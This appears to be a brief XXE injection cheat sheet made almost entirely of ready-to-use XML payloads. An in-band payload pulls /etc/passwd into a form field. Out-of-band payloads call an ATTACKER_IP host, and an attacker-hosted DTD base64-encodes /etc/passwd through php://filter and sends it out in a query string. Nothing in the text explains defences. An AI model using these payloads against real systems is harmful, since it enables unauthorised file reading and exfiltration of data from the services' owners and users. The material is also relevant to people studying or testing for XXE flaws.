# XXE Injection

## In-Band
```xml
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<contact>
	<name>&xxe;</name>
	<email>test@test.com</email>
	<message>test</message>
</contact>
```

## Out-of-Band
<b>Example</b>:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<upload>
  <file>
    http://10.10.27.41/uploads/file_66981c1d9d7f81.07058312.txt
  </file>
</upload>
```

### Test Payload
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

### `sample.dtd` (in attacker’s machine) File Content
```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:port/?data=%cmd;'>">
%oobxxe;
```

### Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:port/sample.dtd">
<upload>
  <file>&exfil;</file>
</upload>
```